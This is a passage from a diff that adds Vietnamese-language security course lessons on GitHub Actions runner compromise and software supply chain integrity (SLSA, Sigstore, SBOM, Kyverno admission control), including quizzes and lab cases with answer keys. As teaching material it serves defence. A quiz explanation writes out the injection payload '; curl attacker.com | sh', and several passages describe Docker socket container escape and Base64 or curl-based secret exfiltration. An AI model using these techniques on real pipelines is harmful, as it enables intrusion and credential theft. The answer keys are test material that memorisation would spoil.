+          "Thu hồi ngay lập tức các phiên IAM STS tạm thời đã phát sinh từ GitHub OIDC và cô lập toàn bộ các máy chủ Self-Hosted Runner bị nghi ngờ thỏa hiệp để điều tra số pháp y."
+        ],
+        "residualRisk": [
+          "Các lỗ hổng 0-day trong chính mã nguồn phần mềm GitHub Actions Runner Agent cho phép thoát khỏi môi trường container runner lên máy chủ chủ.",
+          "Nguy cơ rò rỉ bí mật do lập trình viên cố tình in secrets ra stdout sau khi vượt qua bộ lọc che giấu (masking) của GitHub Actions (ví dụ: in secrets bằng base64 hoặc từng ký tự)."
+        ]
+      },
+      "misconceptions": [
+        {
+          "claim": "GitHub Actions tự động che giấu (mask) các giá trị Secrets bằng dấu '***' trên giao diện web nên kể cả khi runner bị chiếm quyền, kẻ tấn công cũng không thể đọc được nội dung bí mật.",
+          "correction": "Bộ lọc masking của GitHub chỉ là cơ chế lọc hiển thị chuỗi trên web console. Kẻ tấn công có quyền RCE trên runner có thể dễ dàng mã hóa secrets sang Base64, Hex, hoặc gửi trực tiếp payload qua lệnh curl HTTP POST tới máy chủ ngoài mà không hề bị hệ thống masking chặn lại."
+        },
+        {
+          "claim": "Chỉ cần đặt Self-Hosted Runner trong mạng nội bộ private subnet (không có IP công cộng) là runner hoàn toàn an toàn trước các cuộc tấn công từ Internet.",
+          "correction": "Sai lầm nghiêm trọng. Runner duy trì một kết nối outbound HTTPS liên tục tới GitHub để kéo (poll) các jobs về thực thi. Nếu kho chứa là công khai hoặc workflow bị dính lỗ hổng PR injection, kẻ tấn công trên Internet có thể ra lệnh cho runner thực thi mã độc ngay bên trong mạng nội bộ của bạn."
+        },
+        {
+          "claim": "Sử dụng Docker-in-Docker (dind) hoặc mount Docker socket (/var/run/docker.sock) trên Self-Hosted Runner là an toàn nếu tiến trình bên trong container runner chạy bằng tài khoản unprivileged.",
+          "correction": "Mount /var/run/docker.sock trao quyền root thực tế trên máy chủ chủ (host) cho bất kỳ tiến trình nào có thể tương tác với Docker daemon. Kẻ tấn công có RCE trong runner có thể gửi lệnh tạo container mới với cờ '--privileged' hoặc mount toàn bộ hệ thống tệp tin của host ('-v /:/host'), thoát hoàn toàn khỏi ranh giới container runner và kiểm soát toàn diện máy chủ mà không phụ thuộc vào quyền hạn của tài khoản runner ban đầu."
+        }
+      ],
+      "quiz": [
+        {
+          "id": "os09-l88-q1",
+          "difficulty": "easy",
+          "question": "Sự khác biệt cốt lõi về mặt bảo mật giữa sự kiện 'pull_request' và 'pull_request_target' trong GitHub Actions là gì?",
+          "options": [
+            {
+              "id": "A",
+              "label": "pull_request chạy nhanh hơn pull_request_target vì không cần biên dịch mã nguồn."
+            },
+            {
+              "id": "B",
+              "label": "pull_request chạy trong ngữ cảnh nhánh fork và không có quyền truy cập Secrets của base repo, trong khi pull_request_target chạy trong ngữ cảnh base branch và có quyền truy cập toàn bộ Secrets."
+            },
+            {
+              "id": "C",
+              "label": "pull_request chỉ hỗ trợ các ngôn ngữ thông dịch như Python/NodeJS, còn pull_request_target hỗ trợ C/C++."
+            },
+            {
+              "id": "D",
+              "label": "pull_request yêu cầu quyền quản trị viên tổ chức để kích hoạt, còn pull_request_target có thể chạy bởi bất kỳ ai."
+            }
+          ],
+          "correctAnswer": "B",
+          "explanation": "Sự kiện pull_request được cô lập hoàn toàn khỏi secrets của base repo để ngăn chặn mã từ fork untrusted đánh cắp thông tin. Ngược lại, pull_request_target chạy trong ngữ cảnh của base branch và được cấp quyền truy cập toàn bộ secrets của repository."
+        },
+        {
+          "id": "os09-l88-q2",
+          "difficulty": "medium",
+          "question": "Tại sao việc viết câu lệnh 'run: echo \"PR Title is: ${{ github.event.pull_request.title }}\"' lại tạo ra lỗ hổng Command Injection nghiêm trọng trong GitHub Actions?",
+          "options": [
+            {
+              "id": "A",
+              "label": "Vì lệnh echo trên hệ điều hành Linux không hỗ trợ in chuỗi ký tự Unicode."
+            },
+            {
+              "id": "B",
+              "label": "Vì GitHub Actions Runner sẽ đánh giá biểu thức nội suy ${{ ... }} và thay thế chuỗi thô trước khi chuyển sang bash shell, cho phép kẻ tấn công chèn các ký tự đặc biệt như ';', '&&' hoặc '`' để thực thi lệnh shell tùy ý."
+            },
+            {
+              "id": "C",
+              "label": "Vì lệnh echo sẽ làm tràn bộ nhớ đệm (buffer overflow) của tiến trình runner agent."
+            },
+            {
+              "id": "D",
+              "label": "Vì tiêu đề PR luôn bị mã hóa SHA-256 khiến shell không thể hiểu được cú pháp."
+            }
+          ],
+          "correctAnswer": "B",
+          "explanation": "GitHub Actions thực hiện thay thế chuỗi biểu thức nội suy trước khi đưa chuỗi lệnh vào shell. Do đó, nếu nội dung tiêu đề PR chứa cú pháp shell như '; curl attacker.com | sh', shell sẽ coi đó là một lệnh mới và thực thi nó với toàn bộ quyền hạn của runner."
+        },
+        {
+          "id": "os09-l88-q3",
+          "difficulty": "hard",
+          "question": "Trong cơ chế AWS IAM OIDC Federation với GitHub Actions, trường Claim nào trong JWT token là yếu tố then chốt nhất bắt buộc phải được ràng buộc chính xác trong Trust Policy để ngăn chặn một repository khác trong cùng organization mạo danh IAM Role?",
+          "options": [
+            {
+              "id": "A",
+              "label": "iss (Token Issuer URL)"
+            },
+            {
+              "id": "B",
+              "label": "aud (Audience)"
+            },
+            {
+              "id": "C",
+              "label": "sub (Subject Claim chứa repo và branch/environment)"
+            },
+            {
+              "id": "D",
+              "label": "exp (Expiration Timestamp)"
+            }
+          ],
+          "correctAnswer": "C",
+          "explanation": "Trường 'sub' (Subject) chứa chuỗi định danh duy nhất của repository và ngữ cảnh kích hoạt (ví dụ: repo:org-name/repo-name:ref:refs/heads/main). Nếu Trust Policy không kiểm tra chính xác 'sub' mà chỉ kiểm tra 'iss' hoặc dùng wildcard 'repo:org-name/*:*', bất kỳ repository nào trong organization cũng có thể mạo danh vai trò IAM này."
+        }
+      ],
+      "transferChallenge": {
+        "scenario": "Một công ty thanh toán trực tuyến phát hiện một kho chứa mã nguồn mở phục vụ SDK của công ty bị kẻ tấn công gửi một Pull Request khai thác lỗ hổng context injection trong workflow 'pull_request_target'. Kẻ tấn công đã thành công trong việc trích xuất AWS STS Temporary Credentials của vai trò 'Prod-Deployer' và cố gắng tạo backdoor trong hệ sinh thái đám mây. Bạn được chỉ định làm Đội trưởng Đội Phản ứng Sự cố CI/CD để khắc phục và tái thiết kế toàn diện hạ tầng pipeline.",
+        "tasks": [
+          "Tiến hành rà soát toàn bộ kho lưu trữ GitHub Organization; bóc tách và viết lại tất cả các workflow đang sử dụng 'pull_request_target' hoặc chèn trực tiếp biểu thức nội suy context vào shell steps.",
+          "Thiết kế lại toàn bộ ma trận IAM Role Trust Policies trên AWS; loại bỏ các wildcard trong Subject claims và chuyển sang kiểm tra chính xác repo và GitHub Environment đi kèm bắt buộc phê duyệt thủ công (Manual Review Gate).",
+          "Chuyển đổi toàn bộ cụm Self-Hosted Runners cố định sang giải pháp Actions Runner Controller (ARC) trên EKS, tích hợp Seccomp/AppArmor và chặn đứng triệt để đường truyền mạng tới IMDS metadata 169.254.169.254."
+        ],
+        "requiredEvidence": [
+          "Bộ quy tắc Actionlint và Pre-commit hook ngăn chặn commit các workflow vi phạm nguyên tắc an toàn context injection",
+          "Tập tin JSON IAM Trust Policy mẫu đã được siết chặt các điều kiện 'sub' và 'aud' cho môi trường production",
+          "Tài liệu kiến trúc triển khai Ephemeral Runners bằng Actions Runner Controller (ARC) kèm file cấu hình NetworkPolicy chặn IMDS"
+        ]
+      },
+      "sources": [
+        {
+          "title": "GitHub Security Lab — Keeping your GitHub Actions and workflows secure: Preventing pwn requests",
+          "url": "https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
+          "publisher": "GitHub Security Lab",
+          "sourceType": "official-guidance",
+          "accessedAt": "2026-09-04",
+          "supports": [
+            "Phân tích chuyên sâu về rủi ro của sự kiện pull_request_target",
+            "Kỹ thuật Context Expression Script Injection trong GitHub Actions"
+          ]
+        },
+        {
+          "title": "OpenSSF Scorecard — Automated Supply Chain Security Checks",
+          "url": "https://scorecard.dev/",
+          "publisher": "Open Source Security Foundation (OpenSSF)",
+          "sourceType": "official-standard",
+          "accessedAt": "2026-09-04",
+          "supports": [
+            "Tiêu chuẩn đánh giá an ninh đường ống CI/CD và cấp quyền GITHUB_TOKEN tối thiểu",
+            "Thực hành tốt nhất về bảo vệ nhánh và rà soát Pull Request"
+          ]
+        },
+        {
+          "title": "NIST SP 800-204D — Strategies for the Integration of Software Supply Chain Security in DevSecOps CI/CD Pipelines",
+          "url": "https://csrc.nist.gov/pubs/sp/800/204/d/final",
+          "publisher": "National Institute of Standards and Technology (NIST)",
+          "sourceType": "official-standard",
+          "accessedAt": "2026-09-04",
+          "supports": [
+            "Mô hình an ninh tích hợp cho đường ống CI/CD doanh nghiệp",
+            "Kiểm soát ranh giới phân quyền cho các tiến trình build và runner"
+          ]
+        },
+        {
+          "title": "OWASP Top 10 CI/CD Security Risks",
+          "url": "https://owasp.org/www-project-top-10-ci-cd-security-risks/",
+          "publisher": "OWASP Foundation",
+          "sourceType": "official-standard",
+          "accessedAt": "2026-09-04",
+          "supports": [
+            "Rủi ro CICD-SEC-1: Insufficient Flow Control Mechanisms",
+            "Rủi ro CICD-SEC-2: Inadequate Identity and Access Management trong CI/CD"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "os09-l89-software-supply-chain-and-artifact-integrity",
+      "slug": "software-supply-chain-and-artifact-integrity",
+      "title": "Bảo Vệ Chuỗi Cung Ứng Phần Mềm: Khung An Ninh SLSA, Ký Số Sigstore/Cosign, Quản Lý SBOM & Admission Verification",
+      "summary": "Nghiên cứu kiến trúc chuỗi cung ứng phần mềm hiện đại qua lăng kính tấn công toàn diện (từ Source Code, Dependencies, Build Systems đến Artifact Registry), triển khai các cấp độ bảo vệ theo khung OpenSSF SLSA v1.0, thực hành ký số và tạo chứng thực container bằng Sigstore (Cosign, Fulcio, Rekor), sinh và phân tích Software Bill of Materials (SBOM định dạng SPDX/CycloneDX) và cưỡng chế kiểm tra chữ ký tại cửa ngõ cụm Kubernetes bằng Admission Controller.",
+      "difficulty": "expert",
+      "durationMinutes": 180,
+      "prerequisites": ["os09-l88-cicd-pipeline-security-and-runner-compromise"],
+      "outcomes": [
+        "Phân tích các vector tấn công chuỗi cung ứng phần mềm kinh điển và hiện đại (SolarWinds, Codecov, Dependency Confusion, XZ Utils CVE-2024-3094) và đối chiếu với mô hình đe dọa SLSA v1.0.",
+        "Bóc tách nguyên lý vận hành của bộ ba Sigstore (Cosign, Fulcio CA ngắn hạn, Rekor Transparency Log) trong mô hình ký số không dùng khóa dài hạn (Keyless Signing).",
+        "Xây dựng quy trình tự động hóa sinh và ký số chứng thực Software Bill of Materials (SBOM) định dạng CycloneDX/SPDX bằng Syft và Cosign attestations trong CI/CD.",
+        "Triển khai chính sách Admission Control (Kyverno / Sigstore Policy Controller) trên cụm Kubernetes để chặn đứng các container images chưa ký hoặc không có xuất xứ (provenance) hợp lệ."
+      ],
+      "careerPaths": ["penetration-test", "red-team", "purple-team"],
+      "domains": ["cloud", "container", "cicd", "supply-chain"],
+      "attackTactics": [
+        "initial-access",
+        "persistence",
+        "defense-evasion",
+        "supply-chain-compromise"
+      ],
+      "keywords": [
+        "supply-chain-security",
+        "slsa-framework",
+        "sigstore",
+        "cosign",
+        "fulcio",
+        "rekor",
+        "sbom",
+        "cyclonedx",
+        "spdx",
+        "admission-controller",
+        "kyverno",
+        "in-toto"
+      ],
+      "safetyLevel": "isolated-only",
+      "mentalModel": "Một container image hoàn hảo không có lỗ hổng CVE nào vẫn có thể là mã độc nếu kẻ tấn công can thiệp vào quá trình build hoặc thay thế artifact trên registry. Bảo mật chuỗi cung ứng phần mềm không đơn thuần là 'quét lỗ hổng dependency' mà là thiết lập một 'chuỗi bằng chứng mật mã không thể chối bỏ' (cryptographic chain of custody) từ commit mã nguồn của lập trình viên đến khi container được nạp vào nhân máy chủ sản xuất. Khung SLSA cung cấp các mức độ bảo đảm rằng artifact được tạo ra từ mã nguồn chính chủ trên một build pipeline cô lập, trong khi Sigstore và Cosign biến việc ký số trở nên khả thi trên quy mô lớn mà không cần quản lý private keys dài hạn. Nếu không có Admission Controller chặn đứng các container image chưa được ký số và chứng thực provenance, toàn bộ rào chắn bảo mật hạ tầng đều có thể bị vô hiệu hóa bởi một gói phần mềm bị nhiễm độc.",
+      "visual": {
+        "title": "Kiến Trúc Ký Số Không Khóa (Keyless Signing) Bằng Sigstore & Xác Thực Admission Controller",
+        "caption": "Quy trình tạo chữ ký số bằng Cosign, Fulcio và Rekor trong CI/CD và kiểm tra cưỡng chế tại Kubernetes Admission Controller.",
+        "steps": [
+          {
+            "label": "Yêu Cầu Chứng Thư OIDC & Khóa Tạm Thời",
+            "detail": "CI/CD runner sinh cặp khóa ECDSA tạm thời trong bộ nhớ và gửi OIDC token tới CA Fulcio để xin chứng chỉ X.509 ngắn hạn (hiệu lực 10 phút) gắn liền với danh tính pipeline.",
+            "tone": "allow"
+          },
+          {
+            "label": "Ký Image & Ghi Nhật Ký Minh Bạch Rekor",
+            "detail": "Cosign ký digest của container image bằng private key tạm thời, sau đó gửi chữ ký và chứng chỉ lên sổ cái minh bạch Rekor (Transparency Log) để ghi nhận bằng chứng không thể sửa đổi (inclusion proof).",
+            "tone": "allow"
+          },
+          {
+            "label": "Tiêu Hủy Khóa Tạm Thời & Đẩy Metadata Lên OCI",
+            "detail": "Private key tạm thời bị hủy ngay lập tức khỏi bộ nhớ; chữ ký số, chứng chỉ và SBOM attestation được đẩy lên OCI Registry cùng với container image.",
+            "tone": "neutral"
+          },
+          {
+            "label": "Kubernetes Admission Controller Cưỡng Chế Xác Thực",
+            "detail": "Khi có yêu cầu triển khai Pod, Kyverno/Policy Controller chặn request, kiểm tra chữ ký số với Rekor và Fulcio root, từ chối triển khai nếu image bị thiếu chữ ký hoặc không khớp nguồn gốc repository.",
+            "tone": "stop"
+          }
+        ]
+      },
+      "sections": [
+        {
+          "title": "Bản Chất Rủi Ro Chuỗi Cung Ứng Phần Mềm & Khung Chuẩn OpenSSF SLSA v1.0",
+          "paragraphs": [
+            "Chuỗi cung ứng phần mềm hiện đại là một mạng lưới phức tạp gồm hàng ngàn thành phần phụ thuộc: từ mã nguồn của lập trình viên, các gói thư viện mã nguồn mở bên thứ ba (npm, PyPI, Maven, Go modules), đường ống tích hợp và đóng gói CI/CD, kho chứa tạo phẩm (Artifact Registry/Container Registry), cho đến hạ tầng triển khai trên cụm máy chủ sản xuất. Kẻ tấn công nhận ra rằng thay vì tấn công trực diện vào các hệ thống phòng thủ kiên cố của một doanh nghiệp lớn, việc tấn công vào một mắt xích yếu hơn trong chuỗi cung ứng của họ đem lại hiệu quả tàn phá gấp bội.",
+            "Lịch sử an ninh mạng đã chứng kiến những cuộc tấn công chuỗi cung ứng chấn động: SolarWinds (kẻ tấn công cài cắm backdoor Sunburst trực tiếp vào hệ thống build nội bộ Orion trước khi phần mềm được ký số bởi nhà sản xuất), Codecov (sửa đổi script bash uploader được lưu trữ trên máy chủ công khai để trích xuất toàn bộ biến môi trường của các công ty sử dụng dịch vụ), Dependency Confusion (đăng ký các gói mã độc lên các public registry như npmjs/PyPI trùng tên với các gói nội bộ của công ty để đánh lừa công cụ package manager), Typosquatting và vụ việc chấn động XZ Utils (CVE-2024-3094, kẻ tấn công đóng vai trò maintainer đóng góp mã nguồn suốt nhiều năm để âm thầm cài cắm backdoor tinh vi vào thư viện nén liblzma nhằm chiếm quyền SSH daemon trên diện rộng).",
+            "Để chuẩn hóa các yêu cầu phòng vệ chuỗi cung ứng, Quỹ An ninh Mã nguồn Mở (OpenSSF) đã công bố Khung SLSA (Supply-chain Levels for Software Artifacts) phiên bản v1.0. Khung SLSA chia việc bảo vệ thành các track độc lập, trong đó trọng tâm cốt lõi là 'SLSA Build Track' nhằm ngăn chặn việc giả mạo hoặc sửa đổi trái phép artifact trong quá trình build. Khung quy định 3 cấp độ bảo đảm: Build L1 (Yêu cầu quy trình build phải được tự động hóa hoàn toàn bằng script và sinh ra tài liệu Provenance mô tả artifact được tạo ra như thế nào, nhưng chưa yêu cầu xác thực tính tin cậy); Build L2 (Yêu cầu quy trình build phải được thực thi trên một nền tảng build do bên thứ ba quản trị - Hosted Build Platform, và tài liệu Provenance phải được ký số bởi chính dịch vụ build để chống giả mạo từ phía lập trình viên); Build L3 (Cấp độ cao nhất, yêu cầu nền tảng build phải sở hữu tính chất Hermetic và Ephemeral - môi trường hoàn toàn cô lập, độc lập không có kết nối ra ngoài tùy tiện, các tham số build không thể bị can thiệp bởi mã nguồn bên ngoài, và ngăn chặn triệt để việc tồn đọng dữ liệu giữa các lần build).",
+            "Cốt lõi của SLSA là tài liệu Provenance được cấu trúc theo định dạng In-toto Attestation Framework. Một In-toto Statement chứa ba thành phần chính: Subject (danh sách các tạo phẩm được build kèm mã băm SHA-256 không thể giả mạo), PredicateType (xác định cấu trúc dữ liệu, ví dụ: 'https://slsa.dev/provenance/v1'), và Predicate (chứa Builder ID, Invocation parameters, source commit repository URL, và danh sách các nguyên vật liệu đầu vào - materials/resolved dependencies). Nhờ vào tài liệu Provenance có chữ ký số này, người dùng cuối có thể chứng minh được tính nguyên bản của phần mềm trước khi đưa vào vận hành."
+          ]
+        },
+        {
+          "title": "Hệ Sinh Thái Sigstore: Kiến Trúc Ký Số Không Khóa (Keyless Signing) Với Cosign, Fulcio & Rekor",
+          "paragraphs": [
+            "Trước khi dự án Sigstore xuất hiện, việc ký số phần mềm và container image là một bài toán hóc búa đối với hầu hết các tổ chức. Phương pháp truyền thống dựa trên cặp khóa bất đối xứng dài hạn (Long-lived GPG hoặc RSA Key Pairs) gặp phải những rào cản nghiêm trọng về mặt vận hành: Các lập trình viên thường xuyên để lộ private key trong mã nguồn hoặc kho chứa; việc lưu private key trong CI/CD runner biến runner thành mục tiêu bị săn đón hàng đầu; quy trình quản lý vòng đời khóa (Key Management), luân chuyển khóa (Key Rotation) và thu hồi khóa (Key Revocation) khi xảy ra sự cố gần như không thể thực hiện một cách đồng bộ và đáng tin cậy.",
+            "Dự án nguồn mở Sigstore (được quản lý bởi Linux Foundation và OpenSSF) đã thay đổi hoàn toàn cục diện bằng cách đưa ra mô hình Ký Số Không Khóa (Keyless Signing). Khái niệm 'không khóa' không có nghĩa là không sử dụng mật mã học, mà là không yêu cầu người dùng phải tự quản lý các private keys dài hạn. Kiến trúc Sigstore được xây dựng trên ba trụ cột công nghệ nền tảng: Fulcio, Rekor và Cosign.",
+            "Trụ cột thứ nhất là Fulcio (Free Root Certificate Authority): Một trung tâm chứng thực số đóng vai trò cấp các chứng thư số X.509 có thời hạn siêu ngắn (thường chỉ 10 đến 15 phút). Thay vì xác thực qua email hoặc giấy tờ doanh nghiệp, Fulcio xác thực danh tính dựa trên OpenID Connect (OIDC). Khi một lập trình viên hoặc một CI/CD workflow (như GitHub Actions) muốn ký một artifact, họ gửi OIDC JWT của mình tới Fulcio. Fulcio kiểm tra tính hợp lệ của token và cấp phát một chứng thư số X.509 tạm thời có chứa danh tính của người ký (Subject Alternative Name - SAN) chính là địa chỉ email hoặc định danh của pipeline (ví dụ: 'https://github.com/my-org/my-repo/.github/workflows/build.yml@refs/heads/main').",
+            "Trụ cột thứ hai là Rekor (Signature Transparency Log): Một sổ cái ghi chép công khai chỉ cho phép ghi thêm (Append-only Ledger), vận hành dựa trên cấu trúc cây Merkle Tree (tương tự công nghệ Certificate Transparency). Khi Cosign ký một image bằng private key tạm thời, toàn bộ chữ ký, public key, băm của artifact và chứng thư Fulcio sẽ được gửi lên Rekor. Rekor đóng dấu thời gian đáng tin cậy (Signed Entry Timestamp - SET) và trả về một bằng chứng lưu trữ (Inclusion Proof). Ngay sau khi hoàn tất, private key tạm thời sẽ bị hủy vĩnh viễn khỏi bộ nhớ của runner. Nhờ có Rekor, ngay cả khi chứng thư Fulcio hết hạn sau 10 phút, bất kỳ ai trong tương lai cũng có thể kiểm chứng được rằng chữ ký đó đã được tạo ra một cách hợp lệ tại thời điểm chứng thư vẫn còn hiệu lực. Trụ cột thứ ba là Cosign: Công cụ dòng lệnh tiêu chuẩn dùng để ký, xác minh, tạo chứng thực (attestations) và lưu trữ trực tiếp chữ ký số dưới dạng OCI Artifacts trên chính kho chứa container (Docker Hub, GitHub Packages, AWS ECR, GCP Artifact Registry) mà không cần thêm hệ thống lưu trữ bên ngoài."
+          ]
+        },
+        {
+          "title": "Quản Lý Software Bill of Materials (SBOM) & Cưỡng Chế Kiểm Soát Bằng Kubernetes Admission Controller",
+          "paragraphs": [
+            "Software Bill of Materials (SBOM) là 'bảng kê khai nguyên vật liệu phần mềm' chi tiết và toàn diện, đóng vai trò như nhãn thành phần dinh dưỡng trên bao bì thực phẩm. Một SBOM tiêu chuẩn liệt kê toàn bộ các thư viện trực tiếp (Direct Dependencies), các gói phụ thuộc gián tiếp (Transitive Dependencies), phiên bản chính xác, giấy phép bản quyền (Licensing), và mã băm SHA-256 của từng tệp tin cấu thành nên ứng dụng. Hai định dạng chuẩn công nghiệp phổ biến nhất hiện nay là SPDX (System Package Data Exchange, đạt chuẩn quốc tế ISO/IEC 5962:2021) và CycloneDX (chuẩn do OWASP phát triển, tối ưu cho phân tích bảo mật và chuỗi cung ứng).",
+            "Trong quy trình DevSecOps hiện đại, các công cụ quét mã nguồn mở như Syft hoặc Trivy được tích hợp trực tiếp vào đường ống CI/CD để tự động trích xuất SBOM ngay sau khi container image được đóng gói. SBOM sau đó được bọc trong một In-toto Predicate và được Cosign ký số, đẩy lên OCI Registry dưới dạng attestation ('cosign attest --type cyclonedx --predicate sbom.json <image-digest>'). Điều này gắn kết chặt chẽ danh mục nguyên vật liệu với chính container image đó bằng mật mã học, ngăn chặn việc kẻ tấn công tráo đổi hoặc giả mạo bảng thành phần.",
+            "Tuy nhiên, việc ký số container image và sinh SBOM sẽ trở nên vô nghĩa nếu không có một chốt chặn kiểm soát cưỡng chế tại môi trường thực thi (Enforcement Gate). Trong cụm Kubernetes, chốt chặn này chính là Admission Controller (thông qua cơ chế ValidatingWebhookConfiguration). Hai giải pháp hàng đầu hiện nay là Kyverno và Sigstore Policy Controller. Khi một lệnh 'kubectl apply' hoặc một Deployer gửi yêu cầu tạo Pod tới kube-apiserver, API server sẽ chuyển tiếp yêu cầu tới Admission Webhook trước khi lưu dữ liệu vào etcd.",
+            "Admission Controller sẽ thực hiện các bước kiểm tra nghiêm ngặt: (1) Kiểm tra xem image có được ký số bởi Sigstore hay không; (2) Xác minh danh tính người ký trên chứng thư Fulcio có khớp chính xác với repository và workflow được phê duyệt hay không; (3) Kiểm tra sự tồn tại của bản ghi trên Rekor Transparency Log; và (4) Đọc In-toto SBOM attestation đi kèm để đối soát danh mục lỗ hổng (Vulnerability Assessment Gate) - tự động từ chối (Block/Reject) triển khai nếu phát hiện container image chứa bất kỳ lỗ hổng bảo mật nào ở mức Critical hoặc chứa các gói phần mềm không rõ nguồn gốc. Nhờ cơ chế này, cụm Kubernetes sản xuất được bảo vệ tuyệt đối trước mọi nguy cơ nạp các container chưa được kiểm định hoặc bị can thiệp trái phép trên đường truyền."
+          ]
+        },
+        {
+          "title": "Cưỡng Chế Kiểm Tra Chữ Ký Số Và Bằng Chứng Xuất Xứ Tại Cửa Ngõ Cụm Kubernetes",
+          "paragraphs": [
+            "Việc ký số container image và sinh SBOM trong pipeline CI/CD chỉ thực sự tạo ra giá trị phòng thủ khi được bảo chứng bởi một chốt chặn cưỡng chế không thể vượt qua tại cửa ngõ cụm Kubernetes. Nếu thiếu cơ chế Admission Control thực thi chính sách ở chế độ 'Enforce', một lập trình viên vô tình kéo image từ kho ngoài hoặc kẻ tấn công có quyền deploy vẫn có thể khởi tạo các Pod chạy container độc hại hoặc chưa qua kiểm định. Sigstore Policy Controller và Kyverno là hai giải pháp hàng đầu hiện nay giúp hiện thực hóa nguyên tắc Zero-Trust 'Verify Before Deploy' tại tầng Kubernetes Admission Webhook.",
+            "Với Kyverno, quản trị viên định nghĩa các quy tắc 'verifyImages' trong đối tượng ClusterPolicy để kiểm tra tính hợp lệ của chữ ký số Sigstore theo thời gian thực mà không cần nạp và bảo vệ các private key dài hạn rủi ro. Quy tắc này tự động liên hệ với Rekor Transparency Log và Fulcio Root CA để xác thực chứng thư X.509 ngắn hạn, đồng thời đối soát chặt chẽ trường Subject Alternative Name (SAN) với kho lưu trữ mã nguồn và ref cụ thể (ví dụ: 'https://github.com/my-org/my-repo/.github/workflows/deploy.yml@refs/heads/main'). Bất kỳ container image nào thiếu chữ ký số hợp lệ hoặc được ký từ một workflow/người dùng nằm ngoài danh mục tin cậy sẽ bị Kubernetes API Server từ chối ngay lập tức ở giai đoạn Admission Review.",
+            "Không dừng lại ở việc kiểm tra chữ ký của image digest, các chính sách bảo mật hiện đại còn bắt buộc kiểm toán bằng chứng xuất xứ (SLSA Provenance) và Software Bill of Materials (SBOM) trực tiếp at runtime. Sigstore Policy Controller và Kyverno có khả năng giải mã In-toto Attestation đính kèm theo image, áp dụng các biểu thức kiểm tra (sử dụng Common Expression Language - CEL hoặc OPA/Rego) để quét sâu vào nội dung SBOM. Hệ thống sẽ tự động chặn đứng việc tạo Pod nếu phát hiện SBOM chứa các gói thư viện có lỗ hổng bảo mật nghiêm trọng (Critical CVEs theo cơ sở dữ liệu NVD) hoặc chứa các package bị cấm theo chính sách tuân thủ nội bộ, thiết lập rào chắn vững chắc bảo vệ môi trường sản xuất."
+          ]
+        }
+      ],
+      "lab": {
+        "title": "Bảo Vệ Chuỗi Cung Ứng Vùng Chứa: Triển Khai Sigstore Keyless, Ký SBOM & Cưỡng Chế Kyverno Policy",
+        "objective": "Đánh giá rủi ro giả mạo artifact, thiết lập quy trình ký số không khóa cho container images, đóng gói attestation SBOM và xây dựng chính sách admission control từ chối nạp workload không hợp lệ vào cluster.",
+        "scenario": "Doanh nghiệp của bạn chuẩn bị phát hành một phiên bản microservice quan trọng phục vụ thanh toán trực tuyến. Bộ phận An ninh yêu cầu tất cả container images phải có chứng thực nguồn gốc rõ ràng (provenance), được ký số thông qua OIDC của tổ chức và có SBOM đầy đủ không chứa các gói thư viện bị cấm trước khi được phép nạp vào cụm Kubernetes sản xuất.",
+        "constraints": [
+          "Tuyệt đối tuân thủ ADR-001: Mọi cấu hình ký số và xác thực policy phải dựa trên chuẩn OpenSSF Sigstore và Kyverno thực tế, không sử dụng mock simulator.",
+          "Quy trình ký số và kiểm tra SBOM không được làm tăng thời gian triển khai quá 30 giây cho mỗi đợt phát hành.",
+          "Tất cả các chính sách Admission Controller phải tuân thủ chuẩn CIS Software Supply Chain Security Benchmark và OpenSSF SLSA v1.0."
+        ],
+        "cases": [
+          {
+            "id": "case-89-01",
+            "title": "Thiết Kế Đường Ống Đạt Cấp Độ OpenSSF SLSA Build Level 3",
+            "context": "Hệ thống build của công ty hiện đang chạy các job đóng gói Docker image trên một máy chủ Jenkins tự quản trị, nơi các lập trình viên có thể tùy biến script build thông qua file Jenkinsfile lưu trong nhánh tính năng. Sau khi build xong, script tự in ra file provenance.json và commit ngược lại repo.",
+            "prompt": "Thay đổi kiến trúc nào sau đây là bắt buộc để nâng cấp hệ thống đạt chuẩn SLSA Build Level 3 theo đúng đặc tả OpenSSF v1.0?",
+            "options": [
+              {
+                "id": "A",
+                "label": "Chỉ cần mã hóa file provenance.json bằng thuật toán AES-256 trước khi lưu vào kho lưu trữ nội bộ.",
+                "correct": false,
+                "rationale": "Mã hóa đối xứng AES-256 không giải quyết được tính toàn vẹn và nguồn gốc; lập trình viên vẫn có thể can thiệp vào quá trình sinh dữ liệu provenance."
+              },
+              {
+                "id": "B",
+                "label": "Chuyển đổi quy trình build sang một nền tảng build chuyên dụng (như GitHub Actions sử dụng SLSA GitHub Generator trusted re-usable workflows hoặc Tekton Chains): Quá trình build phải chạy trong môi trường Ephemeral và Hermetic hoàn toàn cô lập, các tham số build được cố định không bị can thiệp bởi mã nguồn bên ngoài, và tài liệu Provenance phải được ký số bởi chính nền tảng build thông qua OIDC Identity độc lập.",
+                "correct": true,
+                "rationale": "SLSA Build L3 yêu cầu môi trường build phải Hermetic, Ephemeral và tính toàn vẹn của Provenance không thể bị can thiệp bởi người dùng hay mã nguồn của dự án (Isolated & Verifiable Builder)."
+              },
+              {
+                "id": "C",
+                "label": "Yêu cầu lập trình viên ký file Dockerfile bằng GPG key cá nhân trên máy trạm trước khi tạo Pull Request.",
+                "correct": false,
+                "rationale": "Ký mã nguồn trước khi build chỉ là bước Source Integrity, không chứng minh được artifact cuối cùng được build như thế nào và trên môi trường nào."
+              },
+              {
+                "id": "D",
+                "label": "Tăng tần suất quét SonarQube từ hàng tuần lên sau mỗi commit mã nguồn.",
+                "correct": false,
+                "rationale": "Quét mã tĩnh SonarQube chỉ tìm lỗi cú pháp và lỗ hổng mã nguồn, hoàn toàn không liên quan đến các yêu cầu bảo đảm chuỗi cung ứng của SLSA."
+              }
+            ]
+          },
+          {
+            "id": "case-89-02",
+            "title": "Triển Khai Sigstore Keyless Signing Với GitHub Actions OIDC & Rekor Transparency Log",
+            "context": "Đội ngũ DevOps đang lưu trữ một cặp khóa GPG cố định trong biến bí mật GPG_PRIVATE_KEY của GitHub Secrets để chạy lệnh 'cosign sign --key ...' ký container image. Nhóm An ninh cảnh báo rằng việc lưu khóa dài hạn tiềm ẩn nguy cơ lộ lọt và không thể kiểm toán thời điểm ký đáng tin cậy.",
+            "prompt": "Phương án nào sau đây chuyển đổi sang mô hình Ký Số Không Khóa (Keyless Signing) bằng Sigstore đúng chuẩn kỹ thuật?",
+            "options": [
+              {
+                "id": "A",
